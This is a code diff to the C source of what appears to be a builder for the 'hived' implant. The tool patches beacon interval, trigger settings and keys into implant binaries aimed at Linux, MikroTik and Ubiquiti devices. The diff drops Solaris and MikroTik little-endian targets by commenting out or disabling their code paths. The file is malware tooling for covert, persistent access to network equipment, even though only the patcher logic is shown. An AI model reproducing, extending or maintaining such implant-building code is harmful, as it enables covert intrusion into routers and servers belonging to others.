@@ -12,12 +12,10 @@
 #include <time.h>
 #include "trigger_protocols.h"
 
-#include "_unpatched_solaris_sparc.h"
-#include "_unpatched_solaris_x86.h"
+//#include "_unpatched_solaris_x86.h"
 #include "_unpatched_linux_x86.h"
 #include "_unpatched_mikrotik_x86.h"
 #include "_unpatched_mikrotik_mips.h"
-#include "_unpatched_mikrotik_mipsel.h"
 #include "_unpatched_mikrotik_ppc.h"
 #include "_unpatched_ubiquiti_mips.h"
 
@@ -29,21 +27,19 @@
 #include "polarssl/config.h"
 #include "polarssl/sha1.h"
 
-#define HIVE_SOLARIS_SPARC_FILE "hived-solaris-sparc-PATCHED"
-#define HIVE_SOLARIS_X86_FILE "hived-solaris-x86-PATCHED"
+//#define HIVE_SOLARIS_X86_FILE "hived-solaris-x86-PATCHED"
 #define HIVE_LINUX_X86_FILE "hived-linux-x86-PATCHED"
 #define HIVE_MIKROTIK_X86_FILE "hived-mikrotik-x86-PATCHED"
 #define HIVE_MIKROTIK_MIPS_FILE "hived-mikrotik-mips-PATCHED"
-#define HIVE_MIKROTIK_MIPSEL_FILE "hived-mikrotik-mipsel-PATCHED"
+//#define HIVE_MIKROTIK_MIPSEL_FILE "hived-mikrotik-mipsel-PATCHED"
 #define HIVE_MIKROTIK_PPC_FILE "hived-mikrotik-ppc-PATCHED"
 #define HIVE_UBIQUITI_MIPS_FILE "hived-ubiquiti-mips-PATCHED"
 
-#define HIVE_SOLARIS_SPARC_UNPATCHED "hived-solaris-sparc-UNpatched"
-#define HIVE_SOLARIS_X86_UNPATCHED "hived-solaris-x86-UNpatched"
+//#define HIVE_SOLARIS_X86_UNPATCHED "hived-solaris-x86-UNpatched"
 #define HIVE_LINUX_X86_UNPATCHED "hived-linux-x86-UNpatched"
 #define HIVE_MIKROTIK_X86_UNPATCHED "hived-mikrotik-x86-UNpatched"
 #define HIVE_MIKROTIK_MIPS_UNPATCHED "hived-mikrotik-mips-UNpatched"
-#define HIVE_MIKROTIK_MIPSEL_UNPATCHED "hived-mikrotik-mipsel-UNpatched"
+//#define HIVE_MIKROTIK_MIPSEL_UNPATCHED "hived-mikrotik-mipsel-UNpatched"
 #define HIVE_MIKROTIK_PPC_UNPATCHED "hived-mikrotik-ppc-UNpatched"
 #define HIVE_UBIQUITI_MIPS_UNPATCHED "hived-ubiquiti-mips-UNpatched"
 
@@ -138,11 +134,10 @@ int usage(char **argv)
 	fprintf(stdout, "                             * 'raw' - all unpatched\n");
 	fprintf(stdout, "                             * 'mt-x86'\n");
 	fprintf(stdout, "                             * 'mt-mips' (or 'mt-mipsbe' (deprecated) )\n");
-	fprintf(stdout, "                             * 'mt-mipsel' (or 'mt-mipsle' (deprecated) )\n");
+//	fprintf(stdout, "                             * 'mt-mipsel' (or 'mt-mipsle' (deprecated) )\n");
 	fprintf(stdout, "                             * 'mt-ppc'\n");
 	fprintf(stdout, "                             * 'linux-x86'\n");
 	fprintf(stdout, "                             * 'sol-x86'\n");
-	fprintf(stdout, "                             * 'sol-sparc'\n");
 	fprintf(stdout, "                             * 'ub-mips'\n");
 	fprintf(stdout, "    %s[-h ]%s              - print this usage\n\n", GREEN, RESET);
 //   fprintf(stdout, "  %sExamples:%s\n", BLUE, RESET);
@@ -174,11 +169,10 @@ int main(int argc, char **argv)
 {
 	int optval;
 	int linux_x86 = 0;							// Linux x86
-	int solaris_sparc = 0;						// Solaris SPARC
-	int solaris_x86 = 0;						// Solaris x86
+//	int solaris_x86 = 0;						// Solaris x86
 	int mikrotik_x86 = 0;						// MikroTik x86
 	int mikrotik_mips = 0;						// MikroTik MIPS Big Endian
-	int mikrotik_mipsel = 0;					// MikroTik MIPS Little Endian
+//	int mikrotik_mipsel = 0;					// MikroTik MIPS Little Endian
 	int mikrotik_ppc = 0;						// MikroTik PowerPC [Big Endian]
 	int ubiquiti_mips = 0;						// Ubiquiti MIPS Big Endian
 	int raw = 0;								// unpatched versions
@@ -231,6 +225,7 @@ int main(int argc, char **argv)
 			usage(argv);
 			break;
 
+#if 0	// Solairis (deprecated)
 		case 'I':	// interface to listen for triggers. only needed for solaris
 			if (strlen(optarg) > sizeof(args.iface)) {
 				printf(" ERROR: Name of interface is too long\n");
@@ -240,6 +235,7 @@ int main(int argc, char **argv)
 			memcpy(args.iface, optarg, strlen(optarg));
 
 			break;
+#endif
 
 		case 'i':	// beacon interval
 			args.interval = (unsigned int) atoi(optarg) * 1000;
@@ -341,27 +337,25 @@ int main(int argc, char **argv)
 			keyed = TRUE;
 			break;
 
-		case 'm':	// operating system: valid linux, solaris, all, or raw
+		case 'm':	// operating system: valid Linux, all, or raw
 
 			do {
 				if (OPTMATCH(optarg, "mt-ppc"))		{mikrotik_ppc = 1;		break;}
 				if (OPTMATCH(optarg, "mt-mips"))	{mikrotik_mips = 1;		break;}
 				if (OPTMATCH(optarg, "mt-mipsbe"))	{mikrotik_mips = 1;		break;}
 				if (OPTMATCH(optarg, "mt-x86"))		{mikrotik_x86 = 1;		break;}
-				if (OPTMATCH(optarg, "sol-x86"))	{solaris_x86 = 1;		break;}
-				if (OPTMATCH(optarg, "sol-sparc"))	{solaris_sparc = 1;		break;}
+//				if (OPTMATCH(optarg, "sol-x86"))	{solaris_x86 = 1;		break;}
 				if (OPTMATCH(optarg, "linux-x86"))	{linux_x86 = 1;			break;}
-				if (OPTMATCH(optarg, "mt-mipsel"))	{mikrotik_mipsel = 1;	break;}
-				if (OPTMATCH(optarg, "mt-mipsle"))	{mikrotik_mipsel = 1;	break;}
+//				if (OPTMATCH(optarg, "mt-mipsel"))	{mikrotik_mipsel = 1;	break;}
+//				if (OPTMATCH(optarg, "mt-mipsle"))	{mikrotik_mipsel = 1;	break;}
 				if (OPTMATCH(optarg, "ub-mips"))	{ubiquiti_mips = 1;		break;}
 				if (OPTMATCH(optarg, "raw"))		{raw = 1;				break;}
 
-				if (OPTMATCH(optarg, "all"))		{solaris_sparc = 1,
-													linux_x86 = 1,
-													solaris_x86 = 1,
+				if (OPTMATCH(optarg, "all"))		{linux_x86 = 1,
+//													solaris_x86 = 1,
 													mikrotik_x86 = 1,
 													mikrotik_mips = 1,
-													mikrotik_mipsel = 1,
+//													mikrotik_mipsel = 1,
 													mikrotik_ppc = 1,
 													ubiquiti_mips = 1;		break;}
 				printf(" ERROR: Invalid architecture specified\n");
@@ -422,27 +416,31 @@ int main(int argc, char **argv)
 			return -1;
 		}
 
-		if (	(linux_x86 == 0) && (solaris_sparc == 0) && (solaris_x86 == 0) && (mikrotik_x86 == 0) &&
-				(mikrotik_mips == 0) && (mikrotik_ppc == 0) && (mikrotik_mipsel == 0) && (ubiquiti_mips == 0)) {	// no OS was selected, so default is to build all
-			solaris_sparc = 1;
+		if (	(linux_x86 == 0) &&
+//				(solaris_x86 == 0) &&
+				(mikrotik_x86 == 0) &&
+				(mikrotik_mips == 0) && (mikrotik_ppc == 0) &&
+//				(mikrotik_mipsel == 0) &&
+				(ubiquiti_mips == 0)) {	// no OS was selected, so default is to build all
 			linux_x86 = 1;
-			solaris_x86 = 1;
+//			solaris_x86 = 1;
 			mikrotik_x86 = 1;
 			mikrotik_mips = 1;
-			mikrotik_mipsel = 1;
+//			mikrotik_mipsel = 1;
 			mikrotik_ppc = 1;
 			ubiquiti_mips = 1;
 		}
 
-		if ((solaris_sparc == 1) || (solaris_x86 == 1)) {	// Solaris must have the interface patched in
+#if 0	// Solaris deprecated
+		if (solaris_x86 == 1) {	// Solaris must have the interface patched in
 			if (strlen(args.iface) == 0) {
 				printf("\n");
-				printf("    ERROR: Incomplete options. %sSolaris%s requires an interface be selected.\n", RED,
-				       RESET);
+				printf("    ERROR: Incomplete options. %sSolaris%s requires an interface be selected.\n", RED, RESET);
 				usage(argv);
 				return -1;
 			}
 		}
+#endif
 
 		printf("\n");
 		printf("  This application will generate PATCHED files with the following values:\n\n");
@@ -460,9 +458,11 @@ int main(int argc, char **argv)
 		printf("\t%32s: %-d\n", "Trigger Delay (+/-30 sec)", args.trigger_delay / 1000);
 	}
 
-	if (solaris_sparc == 1 || solaris_x86 == 1) {
+#if 0 // Solaris deprecated
+	if (solaris_x86 == 1) {
 		printf("   . Listening Interface         -> %s     (Solaris Only)\n", args.iface);
 	}
+#endif
 
 	printf("\n");
 	printf("  Target Operating Systems:\n");
@@ -473,21 +473,19 @@ int main(int argc, char **argv)
 		printf("   . Linux/x86\n");
 	}
 
-	if (solaris_sparc == 1 || raw == 1) {
-		printf("   . Solaris/SPARC\n");
-	}
-
+#if 0 // Solaris deprecated
 	if (solaris_x86 == 1 || raw == 1) {
 		printf("   . Solaris/x86\n");
 	}
+#endif
 
 	if (mikrotik_x86 == 1 || raw == 1) {
 		printf("   . MikroTik/x86\n");
 	}
 
-	if (mikrotik_mipsel == 1 || raw == 1) {
-		printf("   . MikroTik/MIPS (little endian)\n");
-	}
+//	if (mikrotik_mipsel == 1 || raw == 1) {
+//		printf("   . MikroTik/MIPS (little endian)\n");
+//	}
 	// beginning of big endian targets
 
 	if (mikrotik_mips == 1 || raw == 1) {
@@ -534,10 +532,9 @@ int main(int argc, char **argv)
 	if (raw == 1) {
 		printf("\n");
 		non_patch(HIVE_LINUX_X86_UNPATCHED, hived_linux_x86_unpatched, hived_linux_x86_unpatched_len);
-		non_patch(HIVE_SOLARIS_SPARC_UNPATCHED, hived_solaris_sparc_unpatched, hived_solaris_sparc_unpatched_len);
-		non_patch(HIVE_SOLARIS_X86_UNPATCHED, hived_solaris_x86_unpatched, hived_solaris_x86_unpatched_len);
+//		non_patch(HIVE_SOLARIS_X86_UNPATCHED, hived_solaris_x86_unpatched, hived_solaris_x86_unpatched_len);
 		non_patch(HIVE_MIKROTIK_X86_UNPATCHED, hived_mikrotik_x86_unpatched, hived_mikrotik_x86_unpatched_len);
-		non_patch(HIVE_MIKROTIK_MIPSEL_UNPATCHED, hived_mikrotik_mipsel_unpatched, hived_mikrotik_mipsel_unpatched_len);
+//		non_patch(HIVE_MIKROTIK_MIPSEL_UNPATCHED, hived_mikrotik_mipsel_unpatched, hived_mikrotik_mipsel_unpatched_len);
 		non_patch(HIVE_MIKROTIK_MIPS_UNPATCHED, hived_mikrotik_mips_unpatched, hived_mikrotik_mips_unpatched_len);
 		non_patch(HIVE_MIKROTIK_PPC_UNPATCHED, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len);
 		non_patch(HIVE_UBIQUITI_MIPS_UNPATCHED, hived_ubiquiti_mips_unpatched, hived_ubiquiti_mips_unpatched_len);
@@ -550,17 +547,19 @@ int main(int argc, char **argv)
 		patch(HIVE_LINUX_X86_FILE, hived_linux_x86_unpatched, hived_linux_x86_unpatched_len, args);
 	}
 
+#if 0 // Solaris deprecated
 	if (solaris_x86 == 1) {
 		patch(HIVE_SOLARIS_X86_FILE, hived_solaris_x86_unpatched, hived_solaris_x86_unpatched_len, args);
 	}
+#endif
 
 	if (mikrotik_x86 == 1) {
 		patch(HIVE_MIKROTIK_X86_FILE, hived_mikrotik_x86_unpatched, hived_mikrotik_x86_unpatched_len, args);
 	}
 
-	if (mikrotik_mipsel == 1) {
-		patch(HIVE_MIKROTIK_MIPSEL_FILE, hived_mikrotik_mipsel_unpatched, hived_mikrotik_mipsel_unpatched_len, args);
-	}
+//	if (mikrotik_mipsel == 1) {
+//		patch(HIVE_MIKROTIK_MIPSEL_FILE, hived_mikrotik_mipsel_unpatched, hived_mikrotik_mipsel_unpatched_len, args);
+//	}
 
 	if (mikrotik_ppc == 1) {
 		patch(HIVE_MIKROTIK_PPC_FILE, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len, args);
@@ -573,12 +572,8 @@ int main(int argc, char **argv)
 	if (ubiquiti_mips == 1) {
 		patch(HIVE_UBIQUITI_MIPS_FILE, hived_ubiquiti_mips_unpatched, hived_ubiquiti_mips_unpatched_len, args);
 	}
-// beginning of big endian targets
-	if (solaris_sparc == 1) {
-		patch(HIVE_SOLARIS_SPARC_FILE, hived_solaris_sparc_unpatched, hived_solaris_sparc_unpatched_len, args);
-	}
-
 	printf("\n");
+
 	return 0;
 }
 
